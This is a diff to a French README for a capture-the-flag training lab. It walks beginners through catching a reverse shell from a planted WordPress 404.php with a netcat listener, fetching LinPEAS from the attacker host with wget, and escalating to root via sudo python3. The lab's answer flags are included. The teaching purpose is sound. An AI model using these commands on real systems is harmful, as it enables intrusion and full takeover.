@@ -28,8 +28,9 @@ sudo apt update
 sudo apt install -y docker.io docker-compose
 sudo systemctl enable docker --now
 sudo usermod -aG docker $USER
-
 ```
+
+> Redémarer ensuite la machine virtuelle ou votre systeme
 
 ##### MacOS
 
@@ -279,3 +280,166 @@ Avec la commande : `nc -lvnp [port]` vous pouvez écouter sur le port spécifier
 - **"-p"** -> specifie local port
 - **"-v"** -> verbose
 - **"-n"** -> numéric-only IP addresses
+
+> Pour mac remplacer simplement "nc" par "netcat"
+
+Et voilà votre listeneur est prés à recevoir la connexion de la machine victime ! Vous pouvez laisser cette connexion de côté et revenir sur votre navigateur web.
+
+Tout est enfin pret nous pouvons obtenir notre **reverse shell** !
+Rendez-vous sur l'adresse ci dessous !
+
+```
+http://10.11.0.2:5500/wp-content/themes/twentyfifteen/404.php
+```
+
+ <img src="documentation/images/exploitation7.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+Magie !! Nous avons bien reçu la connection de la machine et on a le contrôle sur cette dernière.
+
+> Ceux pour qui cela n'a pas fonctionné et ont un message d'erreur "connexion refused" c'est un problème avec docker remplacer simplement dans le fichier php =="10.11.0.1"== par =="host.docker.internal"==
+
+Vous pouvez essayer de taper les commandes de base :
+
+- **ls** -> lister le contenue du répertoire courant
+- **whoami** -> pour connaitre votre utilisateur
+- **uname -a** -> pour connaitre le systeme sur lequel vous êtes
+
+On a le controle de la machine !
+
+> Le shell n'est pas très pratique non ?
+
+C'est vrai que le shell n'est pas très beau et vous aurez l'occasion de voir qu'il est sujet au crash ce qui est très embettant car vous devez refaire toute les manipulations si cela devait arriver ! Il existe evidement plusieurs solution mais celle que je vais vous présentez est la plus simple ! On va utiliser python pour générer un shell plus beau et plus stable.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+<img src="documentation/images/exploitation8.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+On a maintenant un magnifique shell et on peut directement voir notre utilisateur actuel.
+
+En effet, sur cette machine nous somme **www-data** qui est un utilisateur de base sur linux et qui a des **droits sur le serveur web** !
+
+C'est completement logique puisque l'utilisateur qui a executé notre code malveillant (404.php) était **www-data**, l'utilisateur en charge du serveur web.
+
+Le serveur web sur linux se situe dans **/var/www/**
+Rendez-vous dans ce dossier pour trouver votre premier **flag** !!
+
+```bash
+cd /var/www/
+cat user.txt
+```
+
+> empirelabs{dont_l34ve_d3f4ult_cr3ds_b3hind}
+
+Bravo !! Vous venez de trouver votre premier flag !
+
+### Privilege Escalation
+
+Comme son nom l'indique "escalade de privilège" l'objectif de cette section va être d'augmenter son niveau de privilège, c'est a dire etre **root** sur la machine qui est le plus haut niveau de privilège possible.
+
+Il existe tout un tas de manière d'y arriver et dans ce cours nous n'en verrons qu'une seule.
+
+Pour repérer des potentiels faille permettant de passer root il existe des outils qui scanne l'entireté du systeme et vous fais savoir les possibles configurations douteuse. Le plus connu d'entre eux **LinPeas**.
+
+**Pour télécharger :** [Linpeas](https://github.com/peass-ng/PEASS-ng/releases)
+
+> C'est bien de le télécharger mais comment faire pour l'exécuter sur la machine distante ?
+
+Il va effectivement falloir upload le fichier "linpeas.sh" sur la machine victime.
+
+<img src="documentation/images/privesc1.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+Pour cela on va faire un **python server** ! Pour faire simple avec la commande `python3 -m http.server` nous allons créer un serveur web à l'endroit ou la commande est executé. De cette manière puisqu'on a le controle sur la victime nous pouvons faire une requète vers notre propre serveur et demander la ressource **"linpeas.sh"**
+
+Parfait ! On va donc sur la machine victime se placer dans le dossier /tmp `cd /tmp` et sur la machine hôte se mettre dans le dossier qui contient le fichier **linpeas.sh**.
+
+Une fois fait sur la machine hôte nous pouvons utiliser :
+
+```bash
+python3 -m http.server
+```
+
+<img src="documentation/images/privesc2.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+> On peut d'ailleur noté que par défaut le port utilisé est le port 8000
+
+Ensuite sur la machine hôte il faut faire une requête sur ce dernier et cela donne :
+
+```bash
+wget http://10.11.0.1:8000/linpeas.sh
+```
+
+> Si vous avez toujours le problème de "connection refused" utiliser "host.docker.internal"
+
+<img src="documentation/images/privesc3.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+Parfait le fichier est bien sur la machine victime ! Il ne nous reste plus qu'a rendre le fichier exécutable et le tour est joué :
+
+```bash
+chmod +x linpeas.sh
+```
+
+Puis pour l'exécuter :
+
+```bash
+./linpeas.sh
+```
+
+<img src="documentation/images/privesc4.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+LinPeas va un peu tout scanner et la ça deviens un peu compliqué à lire... il y a beaucoup d'information et beaucoup de faux positif mais vous apprendrez avec le temps et l'expérience à regarder ce qui est intéressant !
+
+Dans notre cas une chose retiens mon attention ! Ceci :
+
+<img src="documentation/images/privesc5.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+Traduction : notre utilisateur **www-data** à des droits de superutilisateur sur le binaire python3. Ce qui veut dire qu'il peut exécuter du python en tant que **root** !
+
+Si vous voulez retrouver manuellement ce que Linpeas à trouvé essayer la commande :
+
+```bash
+sudo -l
+```
+
+Cela liste (si il y en a) tout les binaires que vous pouvez lancé en tant que root !
+
+Pour ce genre de faille il existe un site très connu [GTFOBins](https://gtfobins.github.io/).
+
+Il permet de trouvé très simplement en fonction des permissions que vous trouvez sur les fichiers de privesc !
+
+Par exemple nous savons que l'on à accées à **sudo** sur **python3** donc nous pouvons le mettre sur le site :
+
+<img src="documentation/images/privesc6.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+On peut voir qu'il trouve dans sa base de données qu'il y a un **privesc avec python et sudo** ! C'est parfait pour nous !
+
+En cliquant sur le binaire et en descendant un peu on trouve notre bonheur :
+
+<img src="documentation/images/privesc7.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+Testons cette commmande sur la machine victime !
+
+```bash
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+
+<img src="documentation/images/privesc8.png" style="border-radius:5px; box-shadow: 5px 5px 5px #888888;">
+
+Cela à fonctionné ! Nous sommes maintenant **root** sur la machine ! Nous avons atteint le plus haut niveau de privilège !
+
+Il nous reste maintenant plus qu'une seule chose à faire. Récupérer le root flag qui se situe dans un endroit ou seul l'utilisateur **root** à accées "/root"
+
+```bash
+cd /root
+```
+
+et enfin :
+
+```bash
+cat root.txt
+```
+
+> empirelabs{python_s3rp3nt_du_d3sert}
+
+**Bravo vous venez d'arriver à bout de votre première machine !**
